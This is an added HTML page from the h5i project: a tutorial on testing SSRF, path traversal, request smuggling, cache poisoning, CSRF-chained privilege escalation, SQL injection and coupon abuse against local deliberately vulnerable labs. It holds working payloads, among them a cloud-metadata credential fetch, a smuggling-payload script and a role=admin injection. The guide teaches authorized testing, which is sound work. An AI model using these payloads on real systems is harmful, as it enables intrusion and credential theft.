@@ -1,0 +1,179 @@
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Advanced web security testing with h5i | h5i</title><meta name="description" content="Investigate SSRF, HTTP protocol flaws, business logic, and multi-request exploit chains with captured traffic and bounded experiments.">
+<meta name="author" content="h5i-dev"><meta name="theme-color" content="#D21C1C">
+<meta name="color-scheme" content="dark"><meta name="robots" content="index, follow, max-image-preview:large">
+<link rel="canonical" href="https://h5i.dev/guides/advanced-web-security-testing/"><link rel="icon" type="image/png" href="/_static/logo.png">
+<meta property="og:type" content="article"><meta property="og:site_name" content="h5i">
+<meta property="og:title" content="Advanced web security testing with h5i | h5i"><meta property="og:description" content="Investigate SSRF, HTTP protocol flaws, business logic, and multi-request exploit chains with captured traffic and bounded experiments.">
+<meta property="og:url" content="https://h5i.dev/guides/advanced-web-security-testing/"><meta property="og:image" content="https://h5i.dev/_static/social-card.png">
+<meta property="og:image:alt" content="The h5i logo beside the words Agent-Native Web-Security"><meta property="og:locale" content="en_US">
+<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Advanced web security testing with h5i | h5i">
+<meta name="twitter:description" content="Investigate SSRF, HTTP protocol flaws, business logic, and multi-request exploit chains with captured traffic and bounded experiments."><meta name="twitter:image" content="https://h5i.dev/_static/social-card.png">
+<meta name="twitter:image:alt" content="The h5i logo beside the words Agent-Native Web-Security">
+<script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "TechArticle",
+      "headline": "Advanced Web Security Testing",
+      "description": "Investigate SSRF, HTTP protocol flaws, business logic, and multi-request exploit chains with captured traffic and bounded experiments.",
+      "author": {
+        "@type": "Organization",
+        "name": "h5i-dev"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "h5i"
+      },
+      "datePublished": "2026-10-21",
+      "dateModified": "2026-10-21",
+      "image": "https://h5i.dev/_static/social-card.png",
+      "inLanguage": "en",
+      "isPartOf": {
+        "@id": "https://h5i.dev/#website"
+      },
+      "mainEntityOfPage": "https://h5i.dev/guides/advanced-web-security-testing/"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://h5i.dev/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Guides",
+          "item": "https://h5i.dev/guides/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "Advanced Web Security Testing",
+          "item": "https://h5i.dev/guides/advanced-web-security-testing/"
+        }
+      ]
+    }
+  ]
+}</script>
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Archivo:wdth,wght@62..125,100..900&amp;family=IBM+Plex+Mono:wght@400;500;600&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/_static/blog.css?v=6ce29feabf"><link rel="stylesheet" href="/_static/highlight.css?v=31b98f34a5">
+</head>
+<body><nav class="blog-nav">
+  <a class="nav-logo" href="/"><img src="/_static/logo.png" alt="h5i"><span>h5i</span></a>
+  <ul class="nav-links">
+    <li><a href="/features/">Features</a></li><li><a href="/guides/">Guides</a></li>
+    <li><a href="/manual/">Manual</a></li><li><a href="/blog/">Blog</a></li>
+    <li><a href="https://github.com/h5i-dev/h5i" class="nav-cta">GitHub &rarr;</a></li>
+  </ul>
+</nav><main class="article-wrap"><article class="post">
+<header><div class="post-eyebrow">Guide 03 / Advanced testing &middot; 2026-10-21</div>
+<h1>Advanced Web Security Testing</h1><p class="post-deck">When changing one parameter is not enough, trace the boundary the request crosses and the state each later request depends on.</p>
+<div class="post-meta"><span>14 min read</span><span>SSRF &middot; HTTP protocol &middot; Exploit chains</span></div></header>
+<div class="callout"><strong>Outcome.</strong> Turn a suspicious response into a bounded hypothesis about a trust boundary, then keep the requests needed to reproduce or reject it.</div>
+<p>Run the exercises in the linked local CTF labs or against systems you are explicitly authorized to test. Advanced techniques can reach internal services, alter shared caches, or send many requests. Choose targets and budgets deliberately.</p>
+<p>To run the recipes below, start from the <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">local websec CTF</a>. Each numbered lab is a deliberately vulnerable application; start the named lab and open the URL shown before replaying its captured <code>req_0</code>. Install the <code>websec</code> plugin if <code>h5i websec --help</code> says it is unavailable.</p>
+<pre><code class="language-bash">git clone https://github.com/h5i-dev/h5i-tutorial.git
+cd h5i-tutorial/websec
+h5i plugin install websec
+h5i websec --help</code></pre>
+<div class="tbl-wrap"><table class="data"><thead><tr><th>Boundary</th><th>Question</th><th>Evidence to keep</th></tr></thead><tbody><tr><th>Server fetch or file</th><td>Where did the input make the server connect or read?</td><td>Baseline, destination, refusal, or file effect</td></tr><tr><th>HTTP protocol</th><td>Did peers parse the same bytes differently?</td><td>Raw request and each observed response</td></tr><tr><th>Multi-request state</th><td>Which earlier value made the later request succeed?</td><td>Actors, cookies, extracted values, and sequence</td></tr></tbody></table></div>
+<h2 id="ssrf">1. Trace server-side fetches and files</h2>
+<p>For SSRF, the question is whether attacker-controlled input makes the server request a destination outside its intended authority. Inspect where the URL came from, how redirects are followed, and whether the response or an out-of-band effect reveals the fetch. Path traversal, uploads, and local file inclusion cross a similar boundary from a web input into the server's filesystem.</p>
+<p>In lab 25, open the link-preview route to capture the baseline, then change only the URL the server fetches. The second destination is reachable from that lab server; your browser session remains scoped to loopback. Inspect the response ID printed by replay and compare it with the baseline:</p>
+<pre><code class="language-bash">./run.sh 25
+h5i browser open &#x27;http://127.0.0.1:9250/api/preview?url=http://127.0.0.1:9251/&#x27; --session lab25 --new --allow 127.0.0.1
+h5i websec replay req_0 --session lab25 --set query.url=http://127.0.0.1:9251/latest/meta-data/iam/security-credentials/
+h5i websec show res_1 --session lab25 --raw</code></pre>
+<p>Try alternate address spellings only inside the local lab or an authorized scope. A failed fetch may mean a filter worked, a destination was unreachable, or the session policy refused the experiment; those are different outcomes. If the response yields a path, test only the path needed to confirm the hypothesis.</p>
+<p>For path traversal, first show what ordinary replay sends, then preserve the encoded request target byte for byte. Lab 27 strips a plain <code>../</code> before another layer decodes the value:</p>
+<pre><code class="language-bash">./run.sh 27
+h5i browser open &#x27;http://127.0.0.1:9270/download?file=welcome.md&#x27; --session lab27 --new
+h5i websec replay req_0 --session lab27 --set &#x27;query.file=%252e%252e%252fsecret%252fflag.txt&#x27;
+h5i websec replay req_0 --session lab27 --raw-target &#x27;/download?file=%252e%252e%252fsecret%252fflag.txt&#x27;</code></pre>
+<p>Compare the two sent requests and responses. The difference tells you whether client normalization changed the payload before it reached the app. For uploads and local file inclusion, verify the final opened or written path rather than inferring it from a successful HTTP status.</p>
+<h2 id="protocol">2. Inspect request framing and shared state</h2>
+<p>Request smuggling asks whether two HTTP peers disagree on where one request ends. In lab 30, the edge trusts <code>Content-Length</code> while the backend honors chunked encoding. Start and capture the local target, write the request file, then replay its exact bytes:</p>
+<pre><code class="language-bash">./run.sh 30
+h5i browser open &#x27;http://127.0.0.1:9300/&#x27; --session lab30 --new</code></pre>
+<pre><code class="language-bash"># Lab 30: write the exact HTTP/1 bytes before replaying them.
+python3 - &lt;&lt;&#x27;PY&#x27;
+from pathlib import Path
+
+host = &quot;127.0.0.1:9300&quot;
+body = f&quot;0\r\n\r\nGET /admin/flag HTTP/1.1\r\nHost: {host}\r\n\r\n&quot;.encode()
+head = (f&quot;POST / HTTP/1.1\r\nHost: {host}\r\n&quot;
+        f&quot;Content-Type: text/plain\r\nContent-Length: {len(body)}\r\n&quot;
+        f&quot;Transfer-Encoding: chunked\r\n\r\n&quot;).encode()
+Path(&quot;desync.http&quot;).write_bytes(head + body)
+PY
+h5i websec replay req_0 --session lab30 --raw-request ./desync.http
+# Use the response ID printed by replay; inspect every response in the raw record.
+h5i websec show res_1 --session lab30 --raw</code></pre>
+<p><code>--raw-request</code> matters because an ordinary HTTP client would rewrite the framing headers and erase the experiment. CRLF injection and host-header poisoning instead ask whether an input becomes a header or an absolute URL. Cache poisoning asks whether a shared cache omits that influence from its key. Use a control request and a second client view before calling any of these a finding. Do not infer smuggling or cache impact from one anomalous status.</p>
+<p>For a header or cache hypothesis, change one header on a captured control request and compare the resulting responses:</p>
+<pre><code class="language-bash">h5i websec replay req_0 --session lab33 --set header.X-Forwarded-Host=example.test
+h5i websec diff res_0 res_1 --session lab33
+h5i websec show req_1 --session lab33 --raw</code></pre>
+<p>Run <code>./run.sh 33</code> and open <code>http://127.0.0.1:9330/</code> as <code>lab33</code> first. A reflection in one response is only a lead; determine whether a second client receives the changed cached response. Repeat within the permitted rate and record which component produced each answer.</p>
+<h2 id="chains">3. Carry values across requests</h2>
+<p>An exploit chain often needs a value learned from one response in a later request: a token, object ID, redirect target, or freshly created resource. Write down the actor and state at each step. A result from a single replay may disappear when cookies, timing, or application state change. Use a sequence or a versioned <code>h5i test</code> flow when reproducibility matters.</p>
+<p>In lab 41, an update needs a fresh CSRF token. Create <code>flow.json</code> with login, token extraction, and form submission. The third step sends an extra <code>role</code> field that the form never offered:</p>
+<pre><code class="language-json">{
+  &quot;steps&quot;: [
+    {&quot;name&quot;: &quot;log in&quot;, &quot;resend&quot;: 0, &quot;create&quot;: true,
+     &quot;set&quot;: [&quot;method=POST&quot;, &quot;path=/api/login&quot;,
+             &quot;header.Content-Type=application/json&quot;,
+             &quot;json.user=${user}&quot;, &quot;json.password=${password}&quot;]},
+    {&quot;name&quot;: &quot;get a fresh token&quot;, &quot;resend&quot;: 0, &quot;create&quot;: true,
+     &quot;set&quot;: [&quot;method=GET&quot;, &quot;path=/account/settings&quot;],
+     &quot;extract&quot;: {&quot;csrf&quot;: &quot;regex:name=\&quot;csrf\&quot; value=\&quot;([^\&quot;]+)\&quot;&quot;}},
+    {&quot;name&quot;: &quot;submit a field the form did not offer&quot;, &quot;resend&quot;: 0, &quot;create&quot;: true,
+     &quot;set&quot;: [&quot;method=POST&quot;, &quot;path=/account/settings&quot;,
+             &quot;header.Content-Type=application/x-www-form-urlencoded&quot;,
+             &quot;form.display_name=Guest&quot;, &quot;form.csrf=${csrf}&quot;,
+             &quot;form.role=admin&quot;]},
+    {&quot;name&quot;: &quot;check the new role&quot;, &quot;resend&quot;: 0, &quot;create&quot;: true,
+     &quot;set&quot;: [&quot;method=GET&quot;, &quot;path=/admin/flag&quot;]}
+  ]
+}</code></pre>
+<pre><code class="language-bash">./run.sh 41
+h5i browser open &#x27;http://127.0.0.1:9410/&#x27; --session lab41 --new
+h5i websec sequence flow.json --session lab41 --var user=guest --var password=guest</code></pre>
+<p>The sequence satisfies CSRF and tests field authorization. Check the step outputs and then read the resulting account state; a successful POST alone is insufficient. Record each actor, cookie jar, extracted value, and changed field. Turn a confirmed chain into a versioned <code>h5i test</code> flow rather than relying on a one-off shell history.</p>
+<h2 id="other-boundaries">4. Check interpreter and workflow boundaries</h2>
+<p>SQL, NoSQL, shell, templates, and XML parsers have different syntax, but the same review question: did untrusted data become an instruction for another interpreter? Use a harmless local control to establish the parser and the exact sink before testing a stronger hypothesis. Error-based, boolean, and timing observations need different controls; timing especially needs repeated measurements and a stable baseline.</p>
+<p>In lab 12, capture a normal product search and send one quote. Then compare true and false predicates with the same prefix; a syntax error alone does not establish control of the query's logic:</p>
+<pre><code class="language-bash">./run.sh 12
+h5i browser open &#x27;http://127.0.0.1:9120/api/products?q=compass&#x27; --session lab12 --new
+h5i websec replay req_0 --session lab12 --set &quot;query.q=compass&#x27;&quot;
+h5i websec replay req_0 --session lab12 --set &quot;query.q=compass%&#x27; AND &#x27;1&#x27;=&#x27;1&#x27; -- &quot;
+h5i websec replay req_0 --session lab12 --set &quot;query.q=compass%&#x27; AND &#x27;1&#x27;=&#x27;2&#x27; -- &quot;</code></pre>
+<p>Business-logic bugs cross a state boundary instead of a parser boundary. Race a check-then-act operation only within an agreed request budget; test whether individually valid coupons compound beyond the intended limit; check whether a second authentication step can be skipped by replaying a later request. Predictable recovery tokens and unsafe signed deserialization are separate mechanisms. For each, state the expected invariant, the sequence that may violate it, and the server-side state that would establish impact.</p>
+<p>For a state example, lab 36 accepts a list of coupons. Compare one valid coupon with a duplicate list and then inspect the resulting checkout total:</p>
+<pre><code class="language-bash">./run.sh 36
+h5i browser open &#x27;http://127.0.0.1:9360/&#x27; --session lab36 --new
+h5i websec replay req_0 --session lab36 --create --set method=POST --set path=/api/checkout --set header.Content-Type=application/json --set json.item=enterprise-license --set &#x27;json.coupons=[&quot;FRIEND25&quot;]&#x27;
+h5i websec replay req_0 --session lab36 --create --set method=POST --set path=/api/checkout --set header.Content-Type=application/json --set json.item=enterprise-license --set &#x27;json.coupons=[&quot;FRIEND25&quot;,&quot;FRIEND25&quot;]&#x27;</code></pre>
+<h2 id="finish">5. Separate evidence from impact</h2>
+<p>Keep the baseline, each changed request, the response or side effect, and the rule you believe was crossed. A response difference is a lead, not an automatic vulnerability verdict. If bytes are the experiment, inspect the sent request; if state is the experiment, preserve the whole sequence and its actors:</p>
+<pre><code class="language-bash">h5i websec requests --session lab41
+h5i websec show req_1 --session lab41 --raw
+h5i websec show res_1 --session lab41 --raw
+h5i browser audit --session lab41</code></pre>
+<p>Use the IDs actually printed by your run. The <a href="/manual/#h5i-websec">manual</a> defines exact edit and replay options. When a result is confirmed, encode the smallest repeatable flow as a regression test.</p>
+
+<a class="next-up" href="/guides/security-regression-testing/"><span class="label">Next guide</span><h3>Security Regression Testing</h3><p>Turn a confirmed finding into a durable CI verdict.</p></a>
+<div class="post-cta"><h3>Make each experiment reviewable</h3><p>Keep the request bytes, actors, and state transitions that support the finding.</p>
+<div class="hero-actions"><a class="btn btn-primary" href="/manual/#h5i-websec">Open the HTTP reference</a></div></div>
+</article></main><footer class="blog-footer"><div class="blog-footer-inner">
+  <div class="brand">h5i<span class="red"> / high-five</span></div>
+  <nav class="links"><a href="/">Home</a><a href="/guides/">Guides</a><a href="/blog/">Blog</a><a href="/manual/">Manual</a><a href="https://github.com/h5i-dev/h5i">GitHub</a></nav>
+  <div class="legal">Apache 2.0 &middot; Built with Rust</div>
+</div></footer>
+<script src="/_static/blog.js?v=41dbda103a" defer></script><script src="/_static/highlight.js?v=ed81eee4e6" defer></script></body></html>
